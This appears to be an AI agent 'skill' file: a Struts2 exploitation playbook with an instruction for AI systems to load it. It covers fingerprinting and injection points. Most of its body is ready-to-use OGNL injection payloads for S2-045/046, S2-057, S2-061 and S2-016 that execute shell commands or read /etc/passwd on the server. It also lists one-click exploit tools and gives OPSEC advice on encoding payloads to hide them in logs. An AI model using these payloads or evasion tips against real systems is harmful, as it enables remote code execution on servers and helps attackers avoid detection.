---
name: struts2-exploitation
description: >-
  Apache Struts2 exploitation playbook. Covers OGNL injection across all major S2 CVEs, Action/namespace-based injection points, Content-Type abuse, double evaluation, and exploit construction.
---

# SKILL: Apache Struts2 Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Struts2 OGNL injection exploitation covering all major S2 CVEs, injection point identification, and exploit payload construction. Base models often miss newer S2 CVEs and the distinction between different injection points.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization/SKILL.md) when deserialization chains are involved
- [shiro-exploitation](../shiro-exploitation/SKILL.md) when Shiro is also present in the target
- [ssti-injection](../ssti/SKILL.md) for general template injection concepts

---

## 1. VULNERABILITY DETECTION

### 1.1 Struts2 Fingerprinting

```
# Response headers
X-Struts-Exception: ...
X- Powered-By: Struts   # Older versions

# URL patterns
*.action, *.do, *.jsp

# Error page — look for Struts stack trace
# Debug mode: ?debug=browser&debug=console
```

### 1.2 Injection Point Categories

| Point | HTTP Location | Example CVE |
|-------|--------------|-------------|
| Content-Type | Request header | S2-045, S2-046 |
| filename | multipart filename | S2-046 |
| Action name | URL path | S2-057, S2-061 |
| Parameter name | Query/body | S2-016, S2-032 |
| Namespace | URL prefix | S2-057 |
| Cookie | Cookie header | S2-028 |

---

## 2. HIGH-VALUE S2 EXPLOITS

### 2.1 S2-045 / S2-046 — Content-Type/Filename OGNL (Most Common)

```http
POST /struts2-showcase/fileupload/doUpload.action HTTP/1.1
Content-Type: %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#empty=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#empty)).(#bean.put("excludedPackageNames",#empty)).(#execute=#instancemanager.newInstance("org.apache.commons.collections.functors.InvokerTransformer")).(#execute.transform(#runtime.exec("id")))}

-- or simpler payload for cmd output --
Content-Type: %{(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### 2.2 S2-057 — Namespace/Action OGNL

Triggered when namespace is evaluated from URL:

```http
GET /%24%7B233*233%7D/action1 HTTP/1.1
# If response contains "54289" (233*233) → vulnerable
```

Exploit:
```
/${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(@java.io.InputStreamReader@new(#process.getInputStream())))}/action
```

### 2.3 S2-061 — Struts2 2.x+ OGNL Sandbox Bypass

```http
POST /index.action HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="name"

%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#empty=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#empty)).(#bean.put("excludedPackageNames",#empty)).(#execute=#instancemanager.newInstance("org.apache.commons.collections.functors.InvokerTransformer")).(#execute.transform(#runtime.exec("id")))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

### 2.4 S2-016 — Parameter Name OGNL (Legacy)

```
/index.action?redirect%3A%24%7B233*233%7D
# If redirected to URL containing "54289" → vulnerable

/index.action?redirect%3A%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27cat%27%2C%27%2Fetc%2Fpasswd%27%7D%29%29.start%28%29%7D
```

---

## 3. EXPLOIT TOOLS

| Tool | Use Case |
|------|----------|
| `Struts2-Scan` | Automated S2 vulnerability scanner |
| `S2-045-S2-046 Exploit` | One-click RCE for S2-045/046 |
| `struts2vuls scan` | Multi-version S2 scanner |
| `S2Exploit` | GUI-based S2 exploitation |
| `ysoserial` | When OGNL leads to deserialization |

---

## 4. OGNL SANDBOX BYPASS EVOLUTION

| Version | Bypass Technique |
|---------|-----------------|
| Pre-S2-003 | Direct OGNL in parameters |
| S2-003–S2-008 | `#_memberAccess` manipulation |
| S2-009 | DMI bypass via OGNL |
| S2-016 | `redirect:` / `action:` prefix |
| S2-032–S2-037 | DMI + method prefix |
| S2-045/046 | Content-Type / filename |
| S2-048 | TextParseUtil (Struts2 plugin) |
| S2-057 | Namespace evaluation |
| S2-061 | BeanMap sandbox bypass |

---

## 5. OPSEC NOTES

- OGNL payloads are very visible in logs — use encoding
- S2-045 via Content-Type is in access logs — minimal URL footprint
- Struts2 devMode exposes debugging console at `?debug=console`
- Always check for multiple S2 CVEs — patches may be incomplete
